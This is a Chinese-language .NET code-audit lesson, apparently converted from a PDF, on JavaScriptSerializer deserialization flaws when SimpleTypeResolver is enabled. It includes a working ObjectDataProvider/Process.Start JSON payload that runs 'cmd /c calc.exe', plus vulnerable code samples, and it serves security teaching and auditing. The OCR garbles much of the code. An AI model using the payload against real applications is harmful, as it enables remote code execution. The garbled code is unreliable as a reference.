<!--
Source: G:\tmp\安全项目研究\.netskill\.NET高级代码审计（第四课） JavaScriptSerializer反序列化漏洞.pdf-088d720f-e67f-4015-bafb-93ba1a49f35c\full.md
Archived as: JavaScriptSerializer raw lesson material
Purpose: provenance-only reference for authorized .NET code audit skill development.
Do not load by default; prefer structured references unless exact source context is needed.
-->
.NET 高级代码审计（第四课） JavaScriptSerializer 反序列化漏洞

Ivan1ee@360 云影实验室

![](images/23f256ab7b8aa1ba97c53c6d7bf2749dcb9bc54113c995097e032840fed51d05.jpg)

2019 年 03 月 01 日

# 0X00 前言

在.NET 处理 Ajax 应用的时候，通常序列化功能由 JavaScriptSerializer 类提供，它是.NET2.0 之后内部实现的序列化功能的类，位于命名空间

System.Web.Script.Serialization、通过 System.Web.Extensions 引用，让开发者轻松实现.Net 中所有类型和 Json 数据之间的转换，但在某些场景下开发者使用

Deserialize 或 DeserializeObject 方法处理不安全的 Json 数据时会造成反序列化攻击从而实现远程 RCE 漏洞，本文笔者从原理和代码审计的视角做了相关介绍和复现。

![](images/0612bac91f77d056e4e8b7148900c9af4d1c7e2da18d5f0900196406e5bb8bd4.jpg)

# 0X01 JavaScriptSerializer 序列化

下面先来看这个系列课程中经典的一段代码：

public class TestClass{ private string classname; private string name; private int age; public string ClassName { get $\Rightarrow$ classname; set $\Rightarrow$ classname $=$ value;} public string Name { get $\Rightarrow$ name; set $\Rightarrow$ name $=$ value;} public int Age { get $\Rightarrow$ age; set $\Rightarrow$ age $=$ value;} public override string.ToString(){ return base.ToString(); } public static void ClassMethod( string value) { Process.Start(value); }

TestClass类定义了三个成员，并实现了一个静态方法ClassMethod启动进程。 序列化通过创建对象实例分别给成员赋值

```javascript
TestClass testClass = new TestClass();
testClass.Name = "Ivan1ee";
testClass.Age = 18;
testClass.Classname = "360";
JavaScriptSerializer jss = new JavaScriptSerializer();
var json_req = jssicles(testClass);
Console.WriteLinejson_req);
Console.ReadKey(); 
```

使用 JavaScriptSerializer 类中的 Serialize 方法非常方便的实现.NET 对象与 Json 数据之间的转化，笔者定义TestClass对象，常规下使用Serialize得到序列化后的Json

```json
{"ClassName":"360","Name":"Ivan1ee","Age":18} 
```

从之前介绍过其它组件反序列化漏洞原理得知需要 __type这个Key的值，要得到这个Value就必须得到程序集全标识（包括程序集名称、版本、语言文化和公钥），那么在JavaScriptSerializer 中可以通过实例化 SimpleTypeResolver 类，作用是为托管类型提供类型解析器，可在序列化字符串中自定义类型的元数据程序集限定名称。笔者将代码改写添加类型解析器

```javascript
JavaScriptSerializer jss = new JavaScriptSerializer(new SimpleTypeResolver()); 
```

这次序列化输出程序集的完整标识，如下

```jsonl
{"_type":"WpfApp1.TestClass, WpfApp1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null,"ClassName":"360","Name":"Ivan1ee","Age":18} 
```

# 0x02 JavaScriptSerializer 反序列化

# 2.1、反序列化用法

反序列化过程就是将 Json 数据转换为对象，在 JavaScriptSerializer 类中创建对象然后调用 DeserializeObject 或 Deserialize 方法实现的

```java
public T ConvertToArray<T>(object obj);   
public object ConvertToArray(object obj, TypeicalsType);   
public T Deserialization<T>(string input);   
public object Deserialization(string input, TypetargetType);   
public object DeserializationObject(string input);   
public void RegisterConverters(IEnumerable<JavaScriptConverter> converters);   
public string serialize(object obj);   
public void serialize(object obj,StringBuilder output); 
```

DeserializeObject 方法只是在 Deserialize 方法上做了一层功能封装，重点来看Deserialize 方法，代码中通过 JavaScriptObjectDeserializer.BasicDeserialize 方法返回 object 对象

```java
internal static object Deserialization(Print serializer, string input, Type type, int depthLimit) { if(input == null){ throw new ArgumentNullException("input"); } if(input.Length > desrializer.MaxJsonLength){ throw new ArgumentException(AtlasWeb.MAX JsonLengthExceeded,"input"); } object = JavaScriptObjectDeserialization.BasicDeserialization(input, depthLimit, desrializer); return ObjectConverter.ConvertObjectToArray(o, type, desrializer); } 
```

在 BasicDeserialize 内部又调用了 DeserializeInternal 方法，当需要转换为对象的时候会判断字典集合中是否包含了 ServerTypeFieldName 常量的 Key，

```objectivec
if(IsNextElementObject()) {
    IDictionary<string, object> dict = DeserializationDictionary(depth);
    // Try to coerce objects to the right type if they have the __serverType
    if ({dict.ContainsKey(JavaScriptSerializer.ServerType fieldName)}) {
        return ObjectConverter.ConvertObjectToArray(obj, null, __tokenizer)];
    }
    return dict;
} 
```

ServerTypeFieldName 常量在 JavaScriptSerializer 类中定义的值为“__type”,

```txt
public class JavaScriptSerializer {
    internal const string ServerTypeFieldName = "_type";
    internal const int DefaultRecursionLimit = 100;
    internal const int DefaultMaxJsonLength = 2097152; 
```

剥茧抽丝，忽略掉非核心方法块 ConvertObjectToType、

ConvertObjectToTypeMain 、ConvertObjectToTypeInternal，最后定位到

ConvertDictionaryToObject 方法内

private static bool ConvertDictionaryToObject(IDictionary<string, object> dictionary, Type type, JavaScriptSerializer serializer, // The target type to instantiate. TypetargetType $\equiv$ type; object s; string serverTypeName $=$ null; object o $=$ dictionary; // Check if __serverType exists in the dictionary, use it as the type. if (dictionary TryGetValue(JavaScriptSerializer.ServerTypeName, out s)) { // Convert the __serverType value to a string. if (ConvertobjecttoUpperCase(s,typeof(String),tokenizer,throwOnError,out s)){ convertedobject $\equiv$ false; return false; } serverTypeName $=$ (string)s; if (serverTypeName != null){ // If we don't have the JavaScriptTypeDef solver, we can't use it if (tokenizer.TypeResolver != null){ // Get the actual type from the resolver. targetType $\equiv$ tokenizer.TypeResolver ResolveType(serverTypeName); // In theory, we should always find the type. If not, it may be some kind of attack. if (targetType $\equiv$ null){ if (throwOnError){ throw new InvalidOperationException(); } convertedobject $\equiv$ null; return false; } // Remove the serverType from the dictionary, even if the resolver was null dictionary.Remove JavaScriptSerializerSERVERTypeName); }

这段代码首先判断 ServerTypeFieldName 存在值的话就输出赋值给对象 s，第二步将对象 s 强制转换为字符串变量 serverTypeName，第三步获取解析器中的实际类型，并且通过 System.Activator 的 CreateInstance 构造类型的实例

```txt
// Instantiate the type if it's coming from the __serverType argument.  
if (serverTypeName != null || IsClientInstantiableType(targetType, serializer)) {  
    // First instantiate the object based on the type.  
    o = Activator.CreateInstance(targetType);  
} 
```

Activator类提供了静态CreateInstance方法的几个重载版本，调用方法的时候既可以传递一个 Type 对象引用，也可以传递标识了类型的 String，方法返回对新对象的引用。下图 Demo 展示了序列化和反序列化前后的效果：

```javascript
TestClass testClass = new TestClass();
testClass.Name = "Ivanlee";
testClass.Age = 18;
testClass.Classname = "360";
JavaScriptSerializer jss = new JavaScriptSerializer(new SimpleTypeResolver());
var json_req = jss_serize(testClass);
Console.WriteLine(json_req);
TestClass obj = jss.Deserialization试验区.json_req);
Console.WriteLine(""); 
Console.WriteLine(obj.Name);
Console.ReadKey(); 
```

反序列化后得到对象的属性，打印输出当前的成员 Name 的值

# 2.2、打造 Poc

默认情况下JavaScriptSerializer 不会使用类型解析器，所以它是一个安全的序列化处理类，漏洞的触发点也是在于初始化 JavaScriptSerializer 类的实例的时候是否创建了SimpleTypeResolver 类，如果创建了，并且反序列化的 Json 数据在可控的情况下就可以触发反序列化漏洞，借图来说明调用链过程

![](images/0f8f1472bc47c0087ba3e4614c7de553e7849ab84657b439b1516c941608440b.jpg)

笔者还是选择 ObjectDataProvider 类方便调用任意被引用类中的方法，具体有关此类的用法可以看一下《.NET 高级代码审计（第一课） XmlSerializer 反序列化漏洞》，因为 Process.Start 方法启动一个线程需要配置 ProcessStartInfo 类相关的属性，例如指定文件名、指定启动参数，所以首先得考虑序列化ProcessStartInfo，这块可参考《.NET 高级代码审计（第三课） Fastjson 反序列化漏洞》

之后对生成的数据做减法，去掉无关的 System.RuntimeType、System.IntPtr 数据，最终得到反序列化 Poc

```python
{  
    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',  
    'MethodName':'Start',  
    'ObjectInstance':{  
        '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',  
        'StartInfo':{  
            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',  
            'FileName':'cmd',  
            'Arguments':'/c calc.exe'  
        }  
    } 
```

笔者编写了触发代码，用 Deserialize<Object>反序列化 Json 成功弹出计算器。

String payload $=$ "@{'   
'_.type':'System.Windows.Data.ObjectDataProvider,PresentationFramework, Version=4.0.0.0,Culture $\equiv$ neutral, PublicKeyToken $= 31$ bf3856ad364e35',   
'MethodName':'Start',   
'objectInstance':{   
'_type':'System.Diagnostics.Process, System, Version=4.0.0.0,Culture $\equiv$ neutral, PublicKeyToken $= 77a5c561934e089$ '   
'StartInfo':{   
'_type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0,Culture $\equiv$ neutral, PublicKeyToken $= 77a5c561934e089$ ,   
'FileName':'cmd',   
'Arguments':'/c calc.exe'   
}   
}";   
JavaScriptSerializer jss $=$ new JavaScriptSerializer(new SimpleTypeResolver());   
var json_req $=$ jss.Deserialization<object>(payload);

![](images/cac9ab988dafc448e9bf57b88e890a26985e926515cc240b8ad7169e118b80ce.jpg)

# 0x03 代码审计视角

# 3.1、Deserialize

从代码审计的角度其实很容易找到漏洞的污染点，通过前面几个小节的知识能发现需要满足一个关键条件 new SimpleTypeResolver() ，再传入 Json 数据，就可被反序列化，例如下面的 JsonHelper 类

```cs
using System;   
using System.Globalization;   
using System.Text;   
using System.Web.ScriptSERIALIZATION;   
namespace ClientPagerProto.DataSource.Viking   
{ public class JsonHelper { public static T ParseJson(I>(string input) { return ParseJson<T>(input,false); } public static T ParseJsonI>(string input, bool includeType) { return (includeType ? new JavaScriptSerializer(new SimpleTypeResolver()) : JsonSerializer).Deserialization<T>(input); } public static string ToJson(object input) { return ToJson(input,false); } 
```

攻击者只需要控制传入字符串参数input便可轻松实现反序列化漏洞攻击。Github上也存在大量的不安全案例代码

using System;   
using System.Web.Scriptserialization;   
using Rackspace Cloud Server. Agent. Configuration;   
namespace Rackspace Cloud Server. Agent. Utilities   
{ public class Json<T> { public T Deserialization(string json) try { return new JavaScriptSerializer(new SimpleTypeResolver().Deserialization<T>(json); } catch { throw new UnsuccessfulCommandExecutionException( String.Format("Problem deserialization the following json: {}["，json)， new ExecutableResult{ ExitCode $=$ "1"}); 1

# 3.2、DeserializeObject

JavaScriptSerializer 还有一个反序列化方法 DeserializeObject，这个方法同样可以触发漏洞，具体污染代码如下

public object JsonToObjects(string strJSON)   
{ JavaScriptSerializer jsonSerialize $=$ new JavaScriptSerializer(new SimpleTypeResolver()); return jsonserialize.Deserializationobject(strJSON);

# 0x04 案例复盘

最后再通过下面案例来复盘整个过程，全程展示在VS里调试里通过反序列化漏洞弹出计算器。

1. 输入 http://localhost:5651/Default Post 加载 value 值

#

![](images/b3e6783b0c08ebb7420447f46a81c306c56cf8e054ec48f7867968bc62e6759d.jpg)

# 2. 通过 DeserializeObject 反序列化 ，并弹出计算器

![](images/4050b6ad0a7a622b3772a3a99c98ee19849ab0b2ed08b1732c54f23c10438d38.jpg)

# 最后附上动态效果图

![](images/119e6ce6c5cc82b1e12c4e0ba3677036dc25fa457343efc60ac23e0a8cedaaa4.jpg)

# 0x05 总结

JavaScriptSerializer 凭借微软自身提供的优势，在实际开发中使用率还是比较高的，只要没有使用类型解析器或者将类型解析器配置为白名单中的有效类型就可以防止反序列化攻击（默认就是安全的序列化器），对于攻击者来说实际场景下估计利用概率不算高，毕竟很多开发者不会使用SimpleTypeResolver 类去处理数据。最后.NET反序列化系列课程笔者会同步到 https://github.com/Ivan1ee/ 、

https://ivan1ee.gitbook.io/ ，后续笔者将陆续推出高质量的.NET 反序列化漏洞文章，欢迎大伙持续关注，交流，更多的.NET安全和技巧可关注实验室公众号。

![](images/3f3e9d1f6346902435029e7f7c71110b12c4d691117ad4d6a8f7c9ff2266e126.jpg)
